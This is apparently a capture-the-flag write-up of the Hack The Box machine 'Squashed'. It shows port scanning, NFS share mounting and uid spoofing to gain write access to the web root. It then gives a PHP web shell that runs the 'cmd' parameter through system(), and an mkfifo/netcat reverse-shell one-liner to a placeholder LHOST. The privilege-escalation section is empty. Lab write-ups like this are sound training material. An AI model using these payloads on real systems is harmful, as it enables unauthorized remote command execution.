# Box: Squashed
# Level: Easy
# OS: Linux
<hr>

Lets get started 

# Recon

## PortScanning

command:```sudo nmap -A 10.129.229.66 -v -p- -T4```

```
Nmap scan report for 10.129.74.160
Host is up (0.21s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      32823/tcp6  mountd
|   100005  1,2,3      35624/udp   mountd
|   100005  1,2,3      42069/udp6  mountd
|   100005  1,2,3      51975/tcp   mountd
|   100021  1,3,4      35047/tcp6  nlockmgr
|   100021  1,3,4      39803/tcp   nlockmgr
|   100021  1,3,4      47441/udp6  nlockmgr
|   100021  1,3,4      53215/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
39803/tcp open  nlockmgr 1-4 (RPC #100021)
44707/tcp open  mountd   1-3 (RPC #100005)
51975/tcp open  mountd   1-3 (RPC #100005)
57011/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/24%OT=22%CT=1%CU=44295%PV=Y%DS=2%DC=T%G=Y%TM=653712
OS:EB%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=102%GCD=2%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 29.196 days (since Sun Sep 24 20:59:31 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   315.93 ms 10.10.14.1
2   315.98 ms 10.129.74.160

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 24 01:42:19 2023 -- 1 IP address (1 host up) scanned in 1143.08 seconds
```
From our nmap scan we have quite a number of ports open. We'll be starting our enumeration today from the port running the nfs service (port 2049)



# Enumeration (Port 2049)

To show mounts, we can use the command below

command:```showmoumt -e 10.129.74.160```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ showmount -e 10.129.74.160        
Export list for 10.129.74.160:
/home/ross    *
/var/www/html *
```
Lets start by mounting the share ```/var/www/html```

commands
```
sudo mkdir /mnt/backup
sudo mount -t nfs 10.129.74.160:/home/ross /mnt/backup
```
```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ sudo mkdir /mnt/backup                               
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ sudo mount -t nfs 10.129.74.160:/home/ross /mnt/backup
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ cd /mnt/backup                           
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[/mnt/backup]
└─$ ls -la          
total 68
drwxr-xr-x 14 1001 1001 4096 Oct 24 01:20 .
drwxr-xr-x  5 root root 4096 Oct 24 01:57 ..
-rw-------  1 1001 1001   57 Oct 24 01:20 .Xauthority
lrwxrwxrwx  1 root root    9 Oct 20  2022 .bash_history -> /dev/null
drwx------ 11 1001 1001 4096 Oct 21  2022 .cache
drwx------ 12 1001 1001 4096 Oct 21  2022 .config
drwx------  3 1001 1001 4096 Oct 21  2022 .gnupg
drwx------  3 1001 1001 4096 Oct 21  2022 .local
lrwxrwxrwx  1 root root    9 Oct 21  2022 .viminfo -> /dev/null
-rw-------  1 1001 1001 2475 Oct 24 01:20 .xsession-errors
-rw-------  1 1001 1001 2475 Dec 27  2022 .xsession-errors.old
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Desktop
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Documents
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Downloads
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Music
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Pictures
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Public
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Templates
drwxr-xr-x  2 1001 1001 4096 Oct 21  2022 Videos
```
There was really nothing interesting here actually.

Lets mount the second share ```/var/www/html```

commands
```
 sudo mkdir /mnt/new_backup
sudo mount -t nfs 10.129.74.160:/var/www/html /mnt/new_backup
```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ sudo mkdir /mnt/new_backup 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ sudo mount -t nfs 10.129.74.160:/var/www/html /mnt/new_backup
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ cd /mnt/new_backup 
cd: permission denied: /mnt/new_backup
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ ls -la /mnt/new_backup 
ls: cannot access '/mnt/new_backup/.': Permission denied
ls: cannot access '/mnt/new_backup/..': Permission denied
ls: cannot access '/mnt/new_backup/.htaccess': Permission denied
ls: cannot access '/mnt/new_backup/index.html': Permission denied
ls: cannot access '/mnt/new_backup/images': Permission denied
ls: cannot access '/mnt/new_backup/css': Permission denied
ls: cannot access '/mnt/new_backup/js': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
?????????? ? ? ? ?            ? .htaccess
?????????? ? ? ? ?            ? css
?????????? ? ? ? ?            ? images
?????????? ? ? ? ?            ? index.html
?????????? ? ? ? ?            ? js
```
oops, we can't view the share we mounted.

We can modify the uid of this user, but before we do that we have to get the uid value itself

command:```stat -c "%u" new_backup```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/squashed]
└─$ cd /mnt                                                      
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[/mnt]
└─$ stat -c "%u" new_backup 
2017
```
We can see the owner of that directory has an uid of ```2017```

Lets use the ```usermod``` command to modify the uid of this user, before that we'll create a new user

commands
```
sudo useradd senjumaru
sudo passwd senjumaru
sudo usermod -u 2017 senjumaru
su senjumaru
python3 -c "import pty;pty.spawn('/bin/bash')"
cd /mnt/new_backup
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e75be6c2-5086-4a39-916c-b5c82afe47d3)

cool cool, we can now view the contents of that directory, which means we have read and write access. Lets exploit this



# Exploitation
Lets modify the contents of the ```index.html``` file, then we'll head over to the webpage to see if it works

```
senjumaru@bl4ck4non-sec:/mnt/new_backup$ echo "vawulence" > index.html
senjumaru@bl4ck4non-sec:/mnt/new_backup$ cat index.html 
vawulence
```
Navigating to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/331e71c6-2679-4ead-a0a8-47ab10d440a2)

Worked hehe.

Lets upload a php revshell to this directory

payload
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3dbbf55b-b5b4-4206-b7c0-884a6c8fc862)

Now that we've sent this, lets access it from the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/db62d9d8-3760-46b5-94b1-67eb10dbab4f)

smooth😅

Lets spawn a reverse shell

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```

Ensure you provide your ```LHOST``` and ```LPORT```

Set up your netcat listener also,

Executing the payload

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e4b25531-6dac-457b-a4b6-b72802dc7a31)

Checking our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f70718a-8bc1-41f0-ab27-85392b2adc19)

We spawned a user shell, lets go ahead and escalate our privileges




# Privilege Escalation























